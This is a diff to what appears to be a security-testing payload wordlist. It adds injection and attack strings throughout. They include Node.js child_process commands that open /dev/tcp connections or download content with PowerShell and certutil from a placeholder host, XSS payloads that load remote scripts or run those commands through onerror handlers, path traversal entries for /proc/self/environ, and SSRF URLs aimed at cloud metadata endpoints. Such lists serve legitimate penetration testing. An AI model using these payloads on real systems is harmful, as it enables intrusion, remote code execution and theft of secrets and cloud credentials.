@@ -664,6 +664,16 @@ child_process.execSync(`powershell -c (New-Object Net.WebClient).DownloadString(
 child_process.execSync(`powershell -c Invoke-WebRequest 'http://{domain}'`);
 child_process.execSync(`printenv`);
 child_process.execSync(`sleep 9`);
+require('child_process').execSync(`/bin/bash -c true > /dev/tcp/{domain}/80`).toString());
+require('child_process').execSync(`/bin/sh -c true > /dev/tcp/{domain}/80`).toString());
+require('child_process').execSync(`certutil -urlcache -f 'http://{domain}'`).toString());
+require('child_process').execSync(`exec 6< /dev/tcp/{domain}/80`).toString());
+require('child_process').execSync(`id`).toString());
+require('child_process').execSync(`ping {domain} -c 2`).toString());
+require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http://{domain}')`).toString());
+require('child_process').execSync(`powershell -c Invoke-WebRequest 'http://{domain}'`).toString());
+require('child_process').execSync(`printenv`).toString());
+require('child_process').execSync(`sleep 9`).toString());
 cos%0Asystem%0A(S%27curl%20{domain}%27%0AtR.%0A
 cos%0Asystem%0A(S%27hostname%27%0AtR.%0A
 cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A
@@ -871,22 +881,22 @@ ${"freemarker.template.utility.Execute"?new()("powershell -c Invoke-WebRequest '
 <!--#exec cmd="whoami"-->
 <!--#printenv -->
 <!--#flastmod virtual="echo.html" -->
-<!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=http://{domain}/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+<!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=//{domain}/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
 <xsl:value-of select="system-property('xsl:version')" /><esi:include src="http://{domain}/data/news.xml" stylesheet="http://{domain}//news_template.xsl"></esi:include>
 javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)//>"
-<img src="{domain}">
+<img src=//{domain}>
 <script>prompt()</script>
 "'`><img src=x onerror=prompt() />
-"'`><img src="{domain}"" onerror=prompt() />
+"'`><img src=//{domain} onerror=prompt() />
 " onclick=alert() a="
-'"><img src=x onerror=alert(1) />
+'"><img src=//{domain} onerror=alert(1) />
 javascript:alert()
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 -->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
-">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://{domain}">
+">><marquee><img src=//{domain} onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="//{domain}"onerror=eval(id&%23x29;>'"><img src="http://{domain}">
 " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
-"'`><ImG Src=X OnerRor=ProMpt(DoCumEnt.DoMAIn)
+"'`><ImG Src=//{domain} OnerRor=ProMpt(DoCumEnt.DoMAIn)
 javascript:alert(1)
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 %3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
@@ -897,7 +907,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 "><scRiPt src=//{domain}></scRiPt>
 `><scRiPt src=//{domain}></scRiPt>
 "'`><scRiPt src=//{domain}></scRiPt>
-JAvasCripT:eval('var a=document.createElement(\'scrIpT\');a.src=\'https://{domain}\';document.body.appendChild(a)')
+JAvasCripT:eval('var a=document.createElement(\'scrIpT\');a.src='//{domain}\';document.body.appendChild(a)')
 <ScrIPt>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{domain}");a.send();</sCrIPt>
 <sCrIpt>$.getScript("//{domain}")</sCRipt>
 </script><svg/onload='+/"/+/onmouseover=1/
@@ -918,7 +928,17 @@ input[value='\">\<script>prompt(1)//>\"']
 //%0D%0A%0d%0a//<ScRiPT>$.getScRiPT("//{domain}")</ScRiPT>
 //%0D%0A%0d%0a//><ScRiPT src=//{domain}></ScRiPT>
 //%0D%0A%0d%0a//><ScRiPT>$.getScRiPT("//{domain}")</ScRiPT>
-%0d%0aLocation:%20http://{domain}
+%0d%0aLocation:%20//{domain}
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`/bin/bash -c true > /dev/tcp/{domain}/80`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`/bin/sh -c true > /dev/tcp/{domain}/80`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`certutil -urlcache -f 'http://{domain}'`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`exec 6< /dev/tcp/{domain}/80`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`id`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`ping {domain} -c 2`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http://{domain}')`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`powershell -c Invoke-WebRequest 'http://{domain}'`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`printenv`).toString());">
+"'`><img src=//{domain} onerror="confirm(require('child_process').execSync(`sleep 9`).toString());">
 /etc/passwd
 ../etc/passwd
 ../../etc/passwd
@@ -936,6 +956,15 @@ input[value='\">\<script>prompt(1)//>\"']
 ....//....//etc/hostname
 ....//....//....//etc/hostname
 ../../../../../../etc/hosts
+../../../../../../proc/self/environ
+..\..\..\..\..\..\proc\self\environ
+/proc/self/environ
+../proc/self/environ
+../../proc/self/environ
+../../../../proc/self/environ
+....//proc/self/environ
+....//....//proc/self/environ
+....//....//....//proc/self/environ
 ../../../../../../proc/1/environ
 ..\..\..\..\..\..\proc\1\environ
 /proc/1/environ
@@ -990,10 +1019,26 @@ http://{domain}
 {white-listed-domain}.{domain}
 https://{domain}
 //{domain}
+http://169.254.169.254
+http://169.254.169.254/
+//169.254.169.254/
+\\169.254.169.254/
+http://169.254.169.254/metadata
+http://169.254.169.254/metadata/
+//169.254.169.254/metadata/
+\\169.254.169.254/metadata\
 http://169.254.169.254/latest/metadata
 http://169.254.169.254/latest/metadata/
-\\169.254.169.254/latest/metadata
 //169.254.169.254/latest/metadata
+\\169.254.169.254\latest\metadata
+http://169.254.169.254/metadata/v1
+http://169.254.169.254/metadata/v1/
+//169.254.169.254/metadata/v1/
+\\169.254.169.254\metadata\v1\
+http://metadata.google.internal/computeMetadata/v1
+http://metadata.google.internal/computeMetadata/v1/
+//metadata.google.internal/computeMetadata/v1
+\\metadata.google.internal\computeMetadata\v1
 /etc/passwd%00
 ../etc/passwd%00
 ../../etc/passwd%00
@@ -1011,6 +1056,15 @@ http://169.254.169.254/latest/metadata/
 ....//....//etc/hostname%00
 ....//....//....//etc/hostname%00
 ../../../../../../etc/hosts%00
+../../../../../../proc/self/environ%00
+..\..\..\..\..\..\proc\self\environ%00
+/proc/self/environ%00
+../proc/self/environ%00
+../../proc/self/environ%00
+../../../../proc/self/environ%00
+....//proc/self/environ%00
+....//....//proc/self/environ%00
+....//....//....//proc/self/environ%00
 ../../../../../../proc/1/environ%00
 ..\..\..\..\..\..\proc\1\environ%00
 /proc/1/environ%00
@@ -1065,15 +1119,34 @@ http://{domain}%00
 {white-listed-domain}.{domain}%00
 https://{domain}%00
 //{domain}%00
+http://169.254.169.254%00
+http://169.254.169.254/%00
+//169.254.169.254/%00
+\\169.254.169.254/%00
+http://169.254.169.254/metadata%00
+http://169.254.169.254/metadata/%00
+//169.254.169.254/metadata/%00
+\\169.254.169.254/metadata\%00
 http://169.254.169.254/latest/metadata%00
 http://169.254.169.254/latest/metadata/%00
-\\169.254.169.254/latest/metadata%00
 //169.254.169.254/latest/metadata%00
+\\169.254.169.254\latest\metadata%00
+http://169.254.169.254/metadata/v1%00
+http://169.254.169.254/metadata/v1/%00
+//169.254.169.254/metadata/v1/%00
+\\169.254.169.254\metadata\v1\%00
+http://metadata.google.internal/computeMetadata/v1%00
+http://metadata.google.internal/computeMetadata/v1/%00
+//metadata.google.internal/computeMetadata/v1%00
+\\metadata.google.internal\computeMetadata\v1%00
 /etc/passwd/*
 ../../../../../../etc/hosts/*
 ..\..\..\..\..\..\etc\hosts/*
 /etc/hostname/*
 ../../../../../../etc/hosts/*
+../../../../../../proc/self/environ/*
+..\..\..\..\..\..\proc\self\environ/*
+/proc/self/environ/*
 ../../../../../../proc/1/environ/*
 ..\..\..\..\..\..\proc\1\environ/*
 /proc/1/environ/*
@@ -1098,15 +1171,34 @@ http://{domain}/*
 {white-listed-domain}.{domain}/*
 https://{domain}/*
 //{domain}/*
+http://169.254.169.254*
+http://169.254.169.254/*
+//169.254.169.254/*
+\\169.254.169.254/*
+http://169.254.169.254/metadata*
+http://169.254.169.254/metadata/*
+//169.254.169.254/metadata/*
+\\169.254.169.254/metadata\*
+http://169.254.169.254/latest/metadata*
 http://169.254.169.254/latest/metadata/*
-http://169.254.169.254/latest/metadata//*
-\\169.254.169.254/latest/metadata/*
-//169.254.169.254/latest/metadata/*
+//169.254.169.254/latest/metadata*
+\\169.254.169.254\latest\metadata*
+http://169.254.169.254/metadata/v1*
+http://169.254.169.254/metadata/v1/*
+//169.254.169.254/metadata/v1/*
+\\169.254.169.254\metadata\v1\*
+http://metadata.google.internal/computeMetadata/v1*
+http://metadata.google.internal/computeMetadata/v1/*
+//metadata.google.internal/computeMetadata/v1*
+\\metadata.google.internal\computeMetadata\v1*
 /etc/passwd/%2f/
 ../../../../../../etc/hosts/%2f/
 ..\..\..\..\..\..\etc\hosts/%2f/
 /etc/hostname/%2f/
 ../../../../../../etc/hosts/%2f/
+../../../../../../proc/self/environ/%2f/
+..\..\..\..\..\..\proc\self\environ/%2f/
+/proc/self/environ/%2f/
 ../../../../../../proc/1/environ/%2f/
 ..\..\..\..\..\..\proc\1\environ/%2f/
 /proc/1/environ/%2f/
@@ -1131,15 +1223,34 @@ http://{domain}/%2f/
 {white-listed-domain}.{domain}/%2f/
 https://{domain}/%2f/
 //{domain}/%2f/
+http://169.254.169.254/%2f/
+http://169.254.169.254//%2f/
+//169.254.169.254//%2f/
+\\169.254.169.254//%2f/
+http://169.254.169.254/metadata/%2f/
+http://169.254.169.254/metadata//%2f/
+//169.254.169.254/metadata//%2f/
+\\169.254.169.254/metadata\/%2f/
 http://169.254.169.254/latest/metadata/%2f/
 http://169.254.169.254/latest/metadata//%2f/
-\\169.254.169.254/latest/metadata/%2f/
 //169.254.169.254/latest/metadata/%2f/
+\\169.254.169.254\latest\metadata/%2f/
+http://169.254.169.254/metadata/v1/%2f/
+http://169.254.169.254/metadata/v1//%2f/
+//169.254.169.254/metadata/v1//%2f/
+\\169.254.169.254\metadata\v1\/%2f/
+http://metadata.google.internal/computeMetadata/v1/%2f/
+http://metadata.google.internal/computeMetadata/v1//%2f/
+//metadata.google.internal/computeMetadata/v1/%2f/
+\\metadata.google.internal\computeMetadata\v1/%2f/
 /etc/passwd/./
 ../../../../../../etc/hosts/./
 ..\..\..\..\..\..\etc\hosts/./
 /etc/hostname/./
 ../../../../../../etc/hosts/./
+../../../../../../proc/self/environ/./
+..\..\..\..\..\..\proc\self\environ/./
+/proc/self/environ/./
 ../../../../../../proc/1/environ/./
 ..\..\..\..\..\..\proc\1\environ/./
 /proc/1/environ/./
@@ -1164,48 +1275,34 @@ http://{domain}/./
 {white-listed-domain}.{domain}/./
 https://{domain}/./
 //{domain}/./
+http://169.254.169.254/./
+http://169.254.169.254//./
+//169.254.169.254//./
+\\169.254.169.254//./
+http://169.254.169.254/metadata/./
+http://169.254.169.254/metadata//./
+//169.254.169.254/metadata//./
+\\169.254.169.254/metadata\/./
 http://169.254.169.254/latest/metadata/./
 http://169.254.169.254/latest/metadata//./
-\\169.254.169.254/latest/metadata/./
 //169.254.169.254/latest/metadata/./
-/etc/passwd/
-../../../../../../etc/hosts/
-..\..\..\..\..\..\etc\hosts/
-/etc/hostname/
-../../../../../../etc/hosts/
-../../../../../../proc/1/environ/
-..\..\..\..\..\..\proc\1\environ/
-/proc/1/environ/
-../../../../../../proc/2/environ/
-..\..\..\..\..\..\proc\2\environ/
-/proc/2/environ/
-../../../../../../proc/3/environ/
-..\..\..\..\..\..\proc\3\environ/
-/proc/3/environ/
-../../../../../../proc/4/environ/
-..\..\..\..\..\..\proc\4\environ/
-/proc/4/environ/
-../../../../../../proc/5/environ/
-..\..\..\..\..\..\proc\5\environ/
-/proc/5/environ/
-C:/windows/system32/drivers/etc/hosts/
-../../../../../../windows/system32/drivers/etc/hosts/
-..\..\..\..\..\..\windows/system32/drivers/etc/hosts/
-http://{domain}/
-\\{domain}/
-{white-listed-domain}/
-{white-listed-domain}.{domain}/
-https://{domain}/
-//{domain}/
-http://169.254.169.254/latest/metadata/
-http://169.254.169.254/latest/metadata//
-\\169.254.169.254/latest/metadata/
-//169.254.169.254/latest/metadata/
+\\169.254.169.254\latest\metadata/./
+http://169.254.169.254/metadata/v1/./
+http://169.254.169.254/metadata/v1//./
+//169.254.169.254/metadata/v1//./
+\\169.254.169.254\metadata\v1\/./
+http://metadata.google.internal/computeMetadata/v1/./
+http://metadata.google.internal/computeMetadata/v1//./
+//metadata.google.internal/computeMetadata/v1/./
+\\metadata.google.internal\computeMetadata\v1/./
 /etc/passwd/*/
 ../../../../../../etc/hosts/*/
 ..\..\..\..\..\..\etc\hosts/*/
 /etc/hostname/*/
 ../../../../../../etc/hosts/*/
+../../../../../../proc/self/environ/*/
+..\..\..\..\..\..\proc\self\environ/*/
+/proc/self/environ/*/
 ../../../../../../proc/1/environ/*/
 ..\..\..\..\..\..\proc\1\environ/*/
 /proc/1/environ/*/
@@ -1230,15 +1327,34 @@ http://{domain}/*/
 {white-listed-domain}.{domain}/*/
 https://{domain}/*/
 //{domain}/*/
+http://169.254.169.254/*/
+http://169.254.169.254//*/
+//169.254.169.254//*/
+\\169.254.169.254//*/
+http://169.254.169.254/metadata/*/
+http://169.254.169.254/metadata//*/
+//169.254.169.254/metadata//*/
+\\169.254.169.254/metadata\/*/
 http://169.254.169.254/latest/metadata/*/
 http://169.254.169.254/latest/metadata//*/
-\\169.254.169.254/latest/metadata/*/
 //169.254.169.254/latest/metadata/*/
+\\169.254.169.254\latest\metadata/*/
+http://169.254.169.254/metadata/v1/*/
+http://169.254.169.254/metadata/v1//*/
+//169.254.169.254/metadata/v1//*/
+\\169.254.169.254\metadata\v1\/*/
+http://metadata.google.internal/computeMetadata/v1/*/
+http://metadata.google.internal/computeMetadata/v1//*/
+//metadata.google.internal/computeMetadata/v1/*/
+\\metadata.google.internal\computeMetadata\v1/*/
 /etc/passwd/..;/
 ../../../../../../etc/hosts/..;/
 ..\..\..\..\..\..\etc\hosts/..;/
 /etc/hostname/..;/
 ../../../../../../etc/hosts/..;/
+../../../../../../proc/self/environ/..;/
+..\..\..\..\..\..\proc\self\environ/..;/
+/proc/self/environ/..;/
 ../../../../../../proc/1/environ/..;/
 ..\..\..\..\..\..\proc\1\environ/..;/
 /proc/1/environ/..;/
@@ -1263,15 +1379,34 @@ http://{domain}/..;/
 {white-listed-domain}.{domain}/..;/
 https://{domain}/..;/
 //{domain}/..;/
+http://169.254.169.254/..;/
+http://169.254.169.254//..;/
+//169.254.169.254//..;/
+\\169.254.169.254//..;/
+http://169.254.169.254/metadata/..;/
+http://169.254.169.254/metadata//..;/
+//169.254.169.254/metadata//..;/
+\\169.254.169.254/metadata\/..;/
 http://169.254.169.254/latest/metadata/..;/
 http://169.254.169.254/latest/metadata//..;/
-\\169.254.169.254/latest/metadata/..;/
 //169.254.169.254/latest/metadata/..;/
+\\169.254.169.254\latest\metadata/..;/
+http://169.254.169.254/metadata/v1/..;/
+http://169.254.169.254/metadata/v1//..;/
+//169.254.169.254/metadata/v1//..;/
+\\169.254.169.254\metadata\v1\/..;/
+http://metadata.google.internal/computeMetadata/v1/..;/
+http://metadata.google.internal/computeMetadata/v1//..;/
+//metadata.google.internal/computeMetadata/v1/..;/
+\\metadata.google.internal\computeMetadata\v1/..;/
 /etc/passwd/..%3B/
 ../../../../../../etc/hosts/..%3B/
 ..\..\..\..\..\..\etc\hosts/..%3B/
 /etc/hostname/..%3B/
 ../../../../../../etc/hosts/..%3B/
+../../../../../../proc/self/environ/..%3B/
+..\..\..\..\..\..\proc\self\environ/..%3B/
+/proc/self/environ/..%3B/
 ../../../../../../proc/1/environ/..%3B/
 ..\..\..\..\..\..\proc\1\environ/..%3B/
 /proc/1/environ/..%3B/
@@ -1297,15 +1432,34 @@ http://{domain}/..%3B/
 {white-listed-domain}.{domain}/..%3B/
 https://{domain}/..%3B/
 //{domain}/..%3B/
+http://169.254.169.254/..%3B/
+http://169.254.169.254//..%3B/
+//169.254.169.254//..%3B/
+\\169.254.169.254//..%3B/
+http://169.254.169.254/metadata/..%3B/
+http://169.254.169.254/metadata//..%3B/
+//169.254.169.254/metadata//..%3B/
+\\169.254.169.254/metadata\/..%3B/
 http://169.254.169.254/latest/metadata/..%3B/
 http://169.254.169.254/latest/metadata//..%3B/
-\\169.254.169.254/latest/metadata/..%3B/
 //169.254.169.254/latest/metadata/..%3B/
+\\169.254.169.254\latest\metadata/..%3B/
+http://169.254.169.254/metadata/v1/..%3B/
+http://169.254.169.254/metadata/v1//..%3B/
+//169.254.169.254/metadata/v1//..%3B/
+\\169.254.169.254\metadata\v1\/..%3B/
+http://metadata.google.internal/computeMetadata/v1/..%3B/
+http://metadata.google.internal/computeMetadata/v1//..%3B/
+//metadata.google.internal/computeMetadata/v1/..%3B/
+\\metadata.google.internal\computeMetadata\v1/..%3B/
 %2e/etc/passwd/
 %2e/../../../../../../etc/hosts/
 %2e\..\..\..\..\..\..\etc\hosts/
 %2e/etc/hostname/
 %2e/../../../../../../etc/hosts/
+%2e/../../../../../../proc/self/environ/
+%2e\..\..\..\..\..\..\proc\self\environ/
+%2e/proc/self/environ/
 %2e/../../../../../../proc/1/environ/
 %2e\..\..\..\..\..\..\proc\1\environ/
 %2e/proc/1/environ/
@@ -1331,15 +1485,34 @@ http://169.254.169.254/latest/metadata//..%3B/
 %2e/{white-listed-domain}.{domain}/
 %2e/https://{domain}/
 %2e///{domain}/
+%2e/http://169.254.169.254
+%2e/http://169.254.169.254/
+%2e///169.254.169.254/
+%2e\\\169.254.169.254/
+%2e/http://169.254.169.254/metadata
+%2e/http://169.254.169.254/metadata/
+%2e///169.254.169.254/metadata/
+%2e\\\169.254.169.254/metadata\
+%2e/http://169.254.169.254/latest/metadata
 %2e/http://169.254.169.254/latest/metadata/
-%2e/http://169.254.169.254/latest/metadata//
-%2e\\\169.254.169.254/latest/metadata/
-%2e///169.254.169.254/latest/metadata/
+%2e///169.254.169.254/latest/metadata
+%2e\\\169.254.169.254\latest\metadata
+%2e/http://169.254.169.254/metadata/v1
+%2e/http://169.254.169.254/metadata/v1/
+%2e///169.254.169.254/metadata/v1/
+%2e\\\169.254.169.254\metadata\v1\
+%2e/http://metadata.google.internal/computeMetadata/v1
+%2e/http://metadata.google.internal/computeMetadata/v1/
+%2e///metadata.google.internal/computeMetadata/v1
+%2e\\\metadata.google.internal\computeMetadata\v1
 //etc/passwd/
 //../../../../../../etc/hosts/
 \\..\..\..\..\..\..\etc\hosts/
 //etc/hostname/
 //../../../../../../etc/hosts/
+//../../../../../../proc/self/environ/
+\\..\..\..\..\..\..\proc\self\environ/
+//proc/self/environ/
 //../../../../../../proc/1/environ/
 \\..\..\..\..\..\..\proc\1\environ/
 //proc/1/environ/
@@ -1365,15 +1538,34 @@ http://169.254.169.254/latest/metadata//..%3B/
 //{white-listed-domain}.{domain}/
 //https://{domain}/
 ////{domain}/
+//http://169.254.169.254
+//http://169.254.169.254/
+////169.254.169.254/
+\\\\169.254.169.254/
+//http://169.254.169.254/metadata
+//http://169.254.169.254/metadata/
+////169.254.169.254/metadata/
+\\\\169.254.169.254/metadata\
+//http://169.254.169.254/latest/metadata
 //http://169.254.169.254/latest/metadata/
-//http://169.254.169.254/latest/metadata//
-\\\\169.254.169.254/latest/metadata/
-////169.254.169.254/latest/metadata/
+////169.254.169.254/latest/metadata
+\\\\169.254.169.254\latest\metadata
+//http://169.254.169.254/metadata/v1
+//http://169.254.169.254/metadata/v1/
+////169.254.169.254/metadata/v1/
+\\\\169.254.169.254\metadata\v1\
+//http://metadata.google.internal/computeMetadata/v1
+//http://metadata.google.internal/computeMetadata/v1/
+////metadata.google.internal/computeMetadata/v1
+\\\\metadata.google.internal\computeMetadata\v1
 /;/etc/passwd/
 /;/../../../../../../etc/hosts/
 \;\..\..\..\..\..\..\etc\hosts/
 /;/etc/hostname/
 /;/../../../../../../etc/hosts/
+/;/../../../../../../proc/self/environ/
+\;\..\..\..\..\..\..\proc\self\environ/
+/;/proc/self/environ/
 /;/../../../../../../proc/1/environ/
 \;\..\..\..\..\..\..\proc\1\environ/
 /;/proc/1/environ/
@@ -1399,15 +1591,34 @@ http://169.254.169.254/latest/metadata//..%3B/
 /;/{white-listed-domain}.{domain}/
 /;/https://{domain}/
 /;///{domain}/
+/;/http://169.254.169.254
+/;/http://169.254.169.254/
+/;///169.254.169.254/
+\;\\\169.254.169.254/
+/;/http://169.254.169.254/metadata
+/;/http://169.254.169.254/metadata/
+/;///169.254.169.254/metadata/
+\;\\\169.254.169.254/metadata\
+/;/http://169.254.169.254/latest/metadata
 /;/http://169.254.169.254/latest/metadata/
-/;/http://169.254.169.254/latest/metadata//
-\;\\\169.254.169.254/latest/metadata/
-/;///169.254.169.254/latest/metadata/
+/;///169.254.169.254/latest/metadata
+\;\\\169.254.169.254\latest\metadata
+/;/http://169.254.169.254/metadata/v1
+/;/http://169.254.169.254/metadata/v1/
+/;///169.254.169.254/metadata/v1/
+\;\\\169.254.169.254\metadata\v1\
+/;/http://metadata.google.internal/computeMetadata/v1
+/;/http://metadata.google.internal/computeMetadata/v1/
+/;///metadata.google.internal/computeMetadata/v1
+\;\\\metadata.google.internal\computeMetadata\v1
 /.;/etc/passwd/
 /.;/../../../../../../etc/hosts/
 \.;\..\..\..\..\..\..\etc\hosts/
 /.;/etc/hostname/
 /.;/../../../../../../etc/hosts/
+/.;/../../../../../../proc/self/environ/
+\.;\..\..\..\..\..\..\proc\self\environ/
+/.;/proc/self/environ/
 /.;/../../../../../../proc/1/environ/
 \.;\..\..\..\..\..\..\proc\1\environ/
 /.;/proc/1/environ/
@@ -1433,10 +1644,26 @@ http://169.254.169.254/latest/metadata//..%3B/
 /.;/{white-listed-domain}.{domain}/
 /.;/https://{domain}/
 /.;///{domain}/
+/.;/http://169.254.169.254
+/.;/http://169.254.169.254/
+/.;///169.254.169.254/
+\.;\\\169.254.169.254/
+/.;/http://169.254.169.254/metadata
+/.;/http://169.254.169.254/metadata/
+/.;///169.254.169.254/metadata/
+\.;\\\169.254.169.254/metadata\
+/.;/http://169.254.169.254/latest/metadata
 /.;/http://169.254.169.254/latest/metadata/
-/.;/http://169.254.169.254/latest/metadata//
-\.;\\\169.254.169.254/latest/metadata/
-/.;///169.254.169.254/latest/metadata/
+/.;///169.254.169.254/latest/metadata
+\.;\\\169.254.169.254\latest\metadata
+/.;/http://169.254.169.254/metadata/v1
+/.;/http://169.254.169.254/metadata/v1/
+/.;///169.254.169.254/metadata/v1/
+\.;\\\169.254.169.254\metadata\v1\
+/.;/http://metadata.google.internal/computeMetadata/v1
+/.;/http://metadata.google.internal/computeMetadata/v1/
+/.;///metadata.google.internal/computeMetadata/v1
+\.;\\\metadata.google.internal\computeMetadata\v1
 %E2%A0%80%0A%E2%A0%80
 undefined
 undef
